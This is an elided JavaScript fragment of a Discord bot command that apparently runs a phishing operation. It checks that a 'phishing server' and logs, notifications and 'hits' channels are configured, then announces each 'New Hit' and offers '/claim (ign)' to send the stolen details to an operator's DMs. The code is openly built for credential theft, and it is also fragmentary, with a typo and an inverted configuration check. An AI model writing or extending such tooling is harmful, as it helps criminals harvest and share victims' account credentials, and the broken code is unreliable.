...
let obj = {
  ...
  callback: async (client, interaction) => {
    ...
    if (settings.length == 0) {
      return interaction.reply({ content: `Configure your phishing server using **/set**`, ephemeral: true })
    }
    settings = settings[0]
    ...
    if (settings.logs_channel) {
      ...
      return interaction.reply({ content: `Configure your logs channel using **/set**`, ephemeral: true })
    }
    if (settings.notification_channel) {
      [nChannelId, nGuildId] = settings?.notification_channel?.split("|")
    } else {
      return interaction.reply({ cotent: `Configure your notifications channel using **/set**`, ephemeral: true })
    }
    if (settings.hits_channel) {
      [hChannelId, hGuildId] = settings.hits_channel?.split("|")
    } else {
      return interaction.reply({ content: `Configure your hits channel using **/set**`, ephemeral: true })
    }
            ...
            if (ids) {
              ...
              client.guilds.cache.get(nGuildId).channels.cache.get(nChannelId).send({
                ...
                embeds: [
                  {
                    title: `New Hit :tada:`,
                    description: `Use /claim (ign) to get the details sent to your DMs.`,
                    color: 0x00ff00,
                  },
                ],
              });
